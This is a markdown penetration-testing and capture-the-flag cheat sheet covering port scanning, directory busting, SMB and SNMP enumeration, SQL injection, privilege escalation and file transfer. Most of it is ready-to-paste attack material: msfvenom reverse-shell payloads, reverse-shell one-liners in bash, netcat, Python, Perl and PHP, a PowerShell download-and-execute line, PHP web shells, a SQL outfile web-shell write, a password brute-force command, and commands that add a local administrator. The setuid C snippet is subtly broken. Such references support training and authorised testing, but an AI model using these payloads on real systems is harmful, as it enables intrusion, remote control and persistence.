# Pentesting and CTF Cheatsheet

## Overview 
A catalog of tools and techniques used for penetration testing and capture the flag. Nothing special, just a useful reference. 

## Enumeration
### Nmap
Common Nmap scans. 

#### Full TCP Port Scan 

```bash 
nmap -v -p- -sV -sS -sC -T4 -oN full-target.scan <target>
```
> Options: verbose, all ports, Service detection, TCP SYN, default scripts, set timing template (Aggressive) and output to file in normal format

```bash 
nmap -v -p- -sV -sT -sC -T3 -oN full-target.scan <target>
```
> Options: -v, all ports, Service detection, TCP connect, default scripts, set timing template (Normal) and output to file in grepable format

#### Common UDP Port Scan 
```bash 
nmap -sU -PN -n -p 0-1024 <target> -sV
```
> Options: UDP scan, treat all hosts online, never do DNS resolution, ports 0-1024 and service detection.

thx [@stevelord](https://twitter.com/stevelord) via [rawhex.com](https://rawhex.com/blogs/news/the-ultimate-port-scanning-guide-part-3-udp-port-scans)

### OneTwoPunch
Use unicornscan to quickly scan all open ports, and then pass the open ports to nmap for detailed scans [onetwopunch](https://github.com/superkojiman/onetwopunch)

```bash
./onetwopunch.sh -t <file> -p all -i tap0 -n -A
```
> Options: target file, all ports, interface, nmap options of All (Enable OS detection, version detection, script scanning, and traceroute)

thx [@superkojiman](https://www.twitter.com/superkojiman) via [superkojiman](https://github.com/superkojiman/onetwopunch)

## Web Scanning
### WordLists
SecLists - https://github.com/danielmiessler/SecLists

### Gobuster
Gobuster - https://github.com/OJ/gobuster 
 
Gobuster quick directory busting
```bash
gobuster -u <host> -w /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -t 10 -a Wakeward
```
> Options: Host and port, default wordlist, number of threads and user agent string

Gobuster search with file extension
```bash
gobuster -u <host> -w /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -t 10 -a Wakeward -x .txt,.php
```
> Options: Host and port, wordlist (SecLists), number of threads, user agent string, file extensions

Gobuster comprehensive directory busting 
```bash
gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/dirbuster/wordlist/directory -t 10 -a Wakeward
```
> Options: valid codes, host and port, wordlist (dirbuster), number of threads, user agent string, file extensions

thx [@scund00r](https://twitter.com/scund00r) via [scund00r.com](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)

### Dirb / Dirbuster
Dirb and Dirbuster are decent but majority of security folks have moved over to Gobuster.  

```bash
dirb http://<host:port>
```
> Options: Host and port, default wordlist

```bash
dirb http://<host:port> /home/wakeward/src/SecLists/Discovery/Web-Content/common.txt -X '.php,.txt,.html'  
```  
> Options: Host and port, wordlist (SecLists) and file extensions

### Wfuzz
Wfuzz is adaptable and useful for false positives such as http status code returning "200 OK" when a resource is not present.  

```bash
wfuzz -c -z file,/home/wakeward/src/SecLists/Discovery/Web-Content/common.txt --hc 404 -R 2 http://<host>/FUZZ.php
```
> Options: output in colours, payload for each FUZZ keyword, hide specific response codes, depth of 2 

```bash 
wfuzz -c -z file,/home/wakeward/src/SecLists/Passwords/darkweb2017-top10000.txt --hc 200 -d "username=tyler&password=FUZZ" http://10.10.10.97/login.php
```
> Options: output in colours, payload for each FUZZ keyword, hide specific response codes, post data. 
 
### Nikto
```bash 
nikto --host <host> --port <port> 
```
> Options: host and port only 

```bash 
nikto --host <host> --port <port>,<port> --ssl 
```
> Options: host, mulitple ports and https  

## SMB 
### Enum4Linux
Enum4linux is a tool for enumerating information from Windows and Samba systems.

```bash
enum4linux -U -o <host>
``` 
> Options: userlist and OS information

```bash
enum4linux -a <host>
``` 
> Options: Do all simple enumeration

### Smbclient
Ftp-like client to access SMB/CIFS resources on servers

```bash
smbclient -L <host> -N
```
> Options: Connect to a default SMB resource with no password

```bash
smbclient -L <host> -U admin
```
> Options: Connect to default SMB resource with admin user

```bash
smbclient \\\\<host>\\"Admin$" -U admin
```
> Options: Connect to a specific SMB resource with admin user

### Rpcclient
Connect to host and execute MS-RPC functions

```bash
rpcclient -U "" <host>
```
> Options: connect with user

## SNMP
### Snmpwalk 
Snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.

```bash
snmpwalk -c public -v 1 -r <host> -p <port>
```
> Options: SNMP community string, SNMP version (1, 2c, 3)

## DNS
### 



# Shells

## Msfvenom
```bash
msfvenom --payload-options
```
> Options: lists the payload options for msfvenom

### Non-Staged
```bash
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o non_staged_reverse_tcp
```
> Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file

### Staged
```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o staged_reverse_tcp
```
> Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file

### Linux Reverse Shell
```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=<port> -b "\x00" -f elf -o rs
```

### Perl
```bash
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f perl -o plrs.pl
```

### Javascript 
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.60 LPORT=<port> -f js_le
```
> Options: 32bit architecture little endian

### Windows Meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f exe -o sheep.exe
```
> Options: windows meterpreter reverse shell payload, local host, local port, bad characters, shell format (exe), output to file

### Windows Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c 
```
> Options: windows reverse shell payload, local host, local port, encode payload, bad characters, shell format (c)

### Windows Bind  Shell
```bash
msfvenom -p windows/shell_bind_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c 
```
> Options: windows bind shell payload, local host, local port, encode payload, bad characters, shell format (c)

### ASP 
```bash
msfvenom -a x86 --platform window -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f asp -o hello.asp
```
> Options: 32bit architecture, windows platform, windows reverse shell payload, local host, local port, bad characters, shell format (asp), output to file

## Reverse Shells
thx [@pentestmonkey](https://twitter.com/pentestmonkey) via [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Bash
```bash
/bin/bash -i > /dev/tcp/<host>/<port> 0<&1 2>&1
```

### PHP
```php
<?php echo system($_REQUEST['wakeward']); ?>
```

```php
<?php echo shell_exec($_REQUEST['wakeward']); ?>
```

```bash
php -r '$sock=fsockopen("<host>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh <host> <port>
```

If option -e is not available
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<host>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl
```perl
perl -e 'use Socket;$i=<host>;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Powershell 
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<host>.ps1')"
```

# SSH

## Port Forwarding 
### Local Port Forwarding
```bash
ssh -L <local port to listen>:<remote host>:<remote port> <localhost>
```

### Remote Port Forwarding
```bash
ssh -R <remote port to bind>:127.0.0.1:<local port> <user@><local host>
```

# SQL Injection (SQLi)

## MySQL 
These are simple MySQL commands to obtain users and passwords. 

### Login
```bash
mysql -host <host> -u <username> -p<password>
Enter Password: 
mysql>
```
### Database Users and Passwords
```sql
SHOW DATABASES;
USE DBNAME;
SHOW TABLES;
SELECT user,host,password FROM users;
```

## Sqlmap 

### sqlmap crawl  
```bash
sqlmap -u http://<host> --crawl=1
```

### sqlmap dump database  
```bash
sqlmap -u http://<host> --dbms=mysql --dump
```

### sqlmap shell  
```bash
sqlmap -u http://<host> --dbms=mysql --os-shell
```

## Manual Methods
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```
### Reverse Shell
```sql
SELECT "<?php echo exec ($_GET['wakeward']);?>" into outfile "/tmp/reverse_shell.php" --
```

# Local Recon

## Local Interactive Shell

```bash
# on the remote host
python -c 'import pty; pty.spawn("/bin/bash")'
```

## FTP 
Download a file from the remote host
```Bash
echo open <host> <port> > ftp.txt
echo USER <username> >> ftp.txt
echo <password> >> ftp.txt
echo bin >> ftp.txt
echo GET <file> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

Upload a file to the remote host
```bash
echo open <host> <port> > ftp.txt
echo USER <username> >> ftp.txt
echo <password> >> ftp.txt
echo bin >> ftp.txt
echo PUT <file> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

## Windows Useful Commands

### Host discovery with only ping
```cmd
FOR /L %i in (1,1,255) do @ping -n 1 10.1.1.%i | find "Reply"
```

### Finding files
Hidden Files
```cmd
dir /ah
```

Files within Subfolders
```cmd
dir <file> /s /p
```

### Adding a new local admin
```cmd
net user /add [username] [password]
net localgroup administrators [username] /add 
```

## Linux Useful Commands

```bash
find . -name <file> 
```

# Privilege Escalation
## Linux
### Resources
* g0tmi1k - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* Linux Privilege Checker Script - https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
* Linux Enumeration Script - https://github.com/rebootuser/LinEnum


### Sudo
```bash
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

### Setuid Technique
Create a c file on the remote host
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
	setuid(0);
	setgid(0);
	system('/bin/bash');
}
```
Compile the c file
```bash
gcc setuid.c -o pwn
chmod 4755 /tmp/pwn
```

## Windows

### Resources
* FuzzySecurity - http://www.fuzzysecurity.com/tutorials/16.html
* sushant747 - https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

### Powershell
* Nishang - https://github.com/samratashok/nishang
* PowerSploit - https://github.com/PowerShellMafia/PowerSploit/

### Vulnerability Checking
* Sherlock - https://github.com/rasta-mouse/Sherlock
* Watson - https://github.com/rasta-mouse/Watson

